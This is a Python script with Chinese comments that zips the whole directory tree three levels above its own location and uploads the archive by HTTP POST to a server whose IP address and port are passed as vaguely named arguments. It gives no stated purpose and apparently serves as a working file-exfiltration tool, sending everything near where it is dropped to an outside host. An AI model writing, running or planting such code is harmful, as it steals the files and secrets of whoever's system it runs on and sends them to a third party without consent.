import os
import zipfile
import argparse
import datetime
from pathlib import Path
from urllib import request, parse
from urllib.request import Request
import mimetypes
import io

# ==================
# 参数解析
# ==================
parser = argparse.ArgumentParser(description="工具")
parser.add_argument("--in1", type=str, required=True)
parser.add_argument("--in2", type=str, required=True)
parser.add_argument("--in3", type=str, required=True)
parser.add_argument("--in4", type=str, required=True)
parser.add_argument("--p", type=str, required=True)
args = parser.parse_args()

location = args.in1 + '.' + args.in2 + '.' + args.in3 + '.' + args.in4 + ':' + args.p

SERVER_URL = f"https://{location}"
EXTRA_FIELDS = {}  # 如需附加字段，例如 {"token": "xxx"}


def zip_grandparent(script_path: str) -> Path:
    """将脚本所在目录的父目录的父目录打包为 zip 文件，返回 zip 路径。"""
    grandparent = Path(script_path).resolve().parent.parent.parent
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_filename = f"rubbish_shiyuan_{timestamp}.zip"  # 注意：原代码中变量 rubbish_shiyuan 未定义，这里修正为字符串字面量
    zip_path = Path(script_path).resolve().parent / zip_filename

    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(grandparent):
            # 防止将 zip 文件自身包含进去
            if str(zip_path.resolve()).startswith(str(Path(root))):
                continue
            for file in files:
                file_path = Path(root) / file
                try:
                    arcname = file_path.relative_to(grandparent)
                    zf.write(file_path, arcname)
                except Exception as e:
                    print(f"[!] 跳过文件 {file_path}: {e}")

    print(f"[+] 已打包: {grandparent} -> {zip_path}")
    return zip_path


def upload_zip(zip_path: Path, url: str, extra_fields: dict = None):
    """
    使用 urllib 通过 multipart/form-data 上传 zip 文件。
    """
    extra_fields = extra_fields or {}

    # 生成 boundary
    boundary = '----WebKitFormBoundary' + ''.join([chr(i) for i in range(65, 91)] * 4)

    # 构建 multipart 数据体
    data_parts = []

    # 添加额外字段
    for key, value in extra_fields.items():
        part = f"--{boundary}\r\n"
        part += f"Content-Disposition: form-data; name=\"{key}\"\r\n\r\n"
        part += f"{value}\r\n"
        data_parts.append(part.encode('utf-8'))

    # 添加文件字段
    filename = zip_path.name
    content_type = "application/zip"

    with open(zip_path, 'rb') as f:
        file_data = f.read()

    part = f"--{boundary}\r\n"
    part += f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
    part += f"Content-Type: {content_type}\r\n\r\n"
    data_parts.append(part.encode('utf-8'))
    data_parts.append(file_data)
    data_parts.append(b"\r\n")

    # 结束边界
    data_parts.append(f"--{boundary}--\r\n".encode('utf-8'))

    # 合并所有部分
    body = b"".join(data_parts)

    # 设置请求头
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': str(len(body))
    }

    # 创建请求对象
    req = Request(url, data=body, headers=headers, method='POST')

    try:
        with request.urlopen(req, timeout=240) as response:
            result = response.read(500).decode('utf-8', errors='ignore')
            print(f"[+] 上传完成: HTTP {response.status}")
            print(result)
            return response
    except Exception as e:
        print(f"[-] 上传失败: {e}")
        return None


# ==================
# 主流程
# ==================
if __name__ == "__main__":
    zip_file = zip_grandparent(__file__)
    upload_zip(zip_file, SERVER_URL, EXTRA_FIELDS)
